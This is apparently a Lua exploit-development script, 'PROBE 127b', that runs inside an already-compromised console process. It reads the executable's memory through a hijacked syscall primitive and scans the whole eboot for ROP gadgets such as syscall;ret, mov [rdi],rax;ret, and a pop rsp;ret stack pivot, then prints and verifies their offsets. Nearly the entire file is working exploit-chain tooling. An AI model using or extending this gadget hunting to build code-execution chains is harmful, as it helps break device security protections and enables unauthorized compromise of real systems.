-- CRASH_CLASS: LOW
-- PROBE 127b: Deep gadget scan across full eboot
--
-- 127a found: mov_[rdi]_rax_ret at +0x98C67 is WRONG (bytes mismatch).
-- No syscall;ret in first 2MB. Need full eboot scan for:
-- 1. syscall;ret (0F 05 C3)
-- 2. mov [rdi],rax;ret (48 89 07 C3)
-- 3. Context around bare syscall at +0x93CBD
-- 4. Any useful 3+ byte gadgets

print("=== PROBE 127b: DEEP GADGET SCAN ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local function alive()
    return N(native.fcall_with_rax(stub, 20)) == pid
end

-- Get eboot base
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local text_lo = rd(N(info) + 0x108) or 0
local text_hi = rd(N(info) + 0x10C) or 0
local text_size_lo = rd(N(info) + 0x110) or 0
if text_lo < 0 then text_lo = text_lo + 0x100000000 end
if text_hi < 0 then text_hi = text_hi + 0x100000000 end
if text_size_lo < 0 then text_size_lo = text_size_lo + 0x100000000 end

local eboot = uint64(string.format("0x%X%08X", text_hi, text_lo))
local eboot_size = text_size_lo
local E = N(eboot)
print(string.format("eboot base=0x%X%08X size=0x%X", text_hi, text_lo, eboot_size))

-- [A] Context around bare syscall at +0x93CBD
print("")
print("[A] Context around bare syscall (+0x93CBD)")
-- Read 8 dwords around the syscall
for off = 0x93CB8, 0x93CD8, 4 do
    local d = rd(E + off) or 0
    if d < 0 then d = d + 0x100000000 end
    local b0 = d % 256
    local b1 = math.floor(d / 256) % 256
    local b2 = math.floor(d / 65536) % 256
    local b3 = math.floor(d / 16777216) % 256
    print(string.format("  +0x%05X: %08X  [%02X %02X %02X %02X]", off, d, b0, b1, b2, b3))
end

-- [B] Full eboot scan for critical patterns
print("")
print("[B] Full eboot scan")

local syscall_ret_list = {}
local syscall_bare_list = {}
local mov_rdi_rax_ret_list = {}
local mov_rdi_rsi_ret_list = {}
local pop_rsp_ret_list = {}

local MAX_EACH = 10

for off = 0, eboot_size - 8, 4 do
    local d0 = rd(E + off)
    if d0 == nil then break end
    if d0 < 0 then d0 = d0 + 0x100000000 end

    local b0 = d0 % 256
    local b1 = math.floor(d0 / 256) % 256
    local b2 = math.floor(d0 / 65536) % 256
    local b3 = math.floor(d0 / 16777216) % 256

    -- syscall;ret = 0F 05 C3 (3 bytes)
    if #syscall_ret_list < MAX_EACH then
        if b0 == 0x0F and b1 == 0x05 and b2 == 0xC3 then
            syscall_ret_list[#syscall_ret_list + 1] = off
        end
        if b1 == 0x0F and b2 == 0x05 and b3 == 0xC3 then
            syscall_ret_list[#syscall_ret_list + 1] = off + 1
        end
    end

    -- syscall bare = 0F 05 (2 bytes), first 5 only
    if #syscall_bare_list < 5 then
        if b0 == 0x0F and b1 == 0x05 then
            syscall_bare_list[#syscall_bare_list + 1] = off
        end
        if b1 == 0x0F and b2 == 0x05 then
            syscall_bare_list[#syscall_bare_list + 1] = off + 1
        end
        if b2 == 0x0F and b3 == 0x05 then
            syscall_bare_list[#syscall_bare_list + 1] = off + 2
        end
    end

    -- mov [rdi], rax; ret = 48 89 07 C3 (4 bytes)
    if #mov_rdi_rax_ret_list < MAX_EACH then
        if b0 == 0x48 and b1 == 0x89 and b2 == 0x07 and b3 == 0xC3 then
            mov_rdi_rax_ret_list[#mov_rdi_rax_ret_list + 1] = off
        end
    end

    -- mov rdi, rsi; ret = 48 89 F7 C3 (4 bytes)
    if #mov_rdi_rsi_ret_list < MAX_EACH then
        if b0 == 0x48 and b1 == 0x89 and b2 == 0xF7 and b3 == 0xC3 then
            mov_rdi_rsi_ret_list[#mov_rdi_rsi_ret_list + 1] = off
        end
    end

    -- pop rsp; ret = 5C C3 (2 bytes) - stack pivot
    if #pop_rsp_ret_list < MAX_EACH then
        if b0 == 0x5C and b1 == 0xC3 then
            pop_rsp_ret_list[#pop_rsp_ret_list + 1] = off
        end
        if b1 == 0x5C and b2 == 0xC3 then
            pop_rsp_ret_list[#pop_rsp_ret_list + 1] = off + 1
        end
        if b2 == 0x5C and b3 == 0xC3 then
            pop_rsp_ret_list[#pop_rsp_ret_list + 1] = off + 2
        end
    end

    -- Also check cross-dword boundary for mov [rdi],rax;ret
    -- Need next dword for cross-boundary 4-byte patterns
    if off + 4 < eboot_size and #mov_rdi_rax_ret_list < MAX_EACH then
        local d1 = rd(E + off + 4)
        if d1 then
            if d1 < 0 then d1 = d1 + 0x100000000 end
            local nb0 = d1 % 256
            -- b1 b2 b3 nb0 across boundary
            if b1 == 0x48 and b2 == 0x89 and b3 == 0x07 and nb0 == 0xC3 then
                mov_rdi_rax_ret_list[#mov_rdi_rax_ret_list + 1] = off + 1
            end
            -- b2 b3 nb0 nb1
            local nb1 = math.floor(d1 / 256) % 256
            if b2 == 0x48 and b3 == 0x89 and nb0 == 0x07 and nb1 == 0xC3 then
                mov_rdi_rax_ret_list[#mov_rdi_rax_ret_list + 1] = off + 2
            end
            -- b3 nb0 nb1 nb2
            local nb2 = math.floor(d1 / 65536) % 256
            if b3 == 0x48 and nb0 == 0x89 and nb1 == 0x07 and nb2 == 0xC3 then
                mov_rdi_rax_ret_list[#mov_rdi_rax_ret_list + 1] = off + 3
            end

            -- Also cross-boundary syscall;ret: b3 nb0 nb1
            if #syscall_ret_list < MAX_EACH then
                if b3 == 0x0F and nb0 == 0x05 and nb1 == 0xC3 then
                    syscall_ret_list[#syscall_ret_list + 1] = off + 3
                end
            end
        end
    end

    -- Progress every 256KB
    if off % 0x40000 == 0 and off > 0 then
        if not alive() then print("DIED during scan!") return end
    end
end

if not alive() then print("DIED!") return end

-- Report results
local function report(name, list)
    if #list == 0 then
        print(string.format("  %-25s NOT FOUND", name))
    else
        local parts = {}
        for _, off in ipairs(list) do
            parts[#parts + 1] = string.format("+0x%X", off)
        end
        print(string.format("  %-25s [%d] %s", name, #list, table.concat(parts, " ")))
    end
end

print("")
print("=== RESULTS ===")
report("syscall;ret (0F 05 C3)", syscall_ret_list)
report("syscall bare (0F 05)", syscall_bare_list)
report("mov [rdi],rax;ret", mov_rdi_rax_ret_list)
report("mov rdi,rsi;ret", mov_rdi_rsi_ret_list)
report("pop rsp;ret (pivot)", pop_rsp_ret_list)

-- [C] Verify found gadgets by reading bytes
print("")
print("[C] Byte verification of found gadgets")

if #syscall_ret_list > 0 then
    for i, off in ipairs(syscall_ret_list) do
        if i > 3 then break end
        local d = rd(E + off) or 0
        if d < 0 then d = d + 0x100000000 end
        local b0 = d % 256
        local b1 = math.floor(d / 256) % 256
        local b2 = math.floor(d / 65536) % 256
        print(string.format("  syscall;ret +0x%X: %02X %02X %02X", off, b0, b1, b2))
    end
end

if #mov_rdi_rax_ret_list > 0 then
    for i, off in ipairs(mov_rdi_rax_ret_list) do
        if i > 3 then break end
        local d = rd(E + off) or 0
        if d < 0 then d = d + 0x100000000 end
        local b0 = d % 256
        local b1 = math.floor(d / 256) % 256
        local b2 = math.floor(d / 65536) % 256
        local b3 = math.floor(d / 16777216) % 256
        print(string.format("  mov[rdi],rax;ret +0x%X: %02X %02X %02X %02X", off, b0, b1, b2, b3))
    end
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 127b COMPLETE ===")
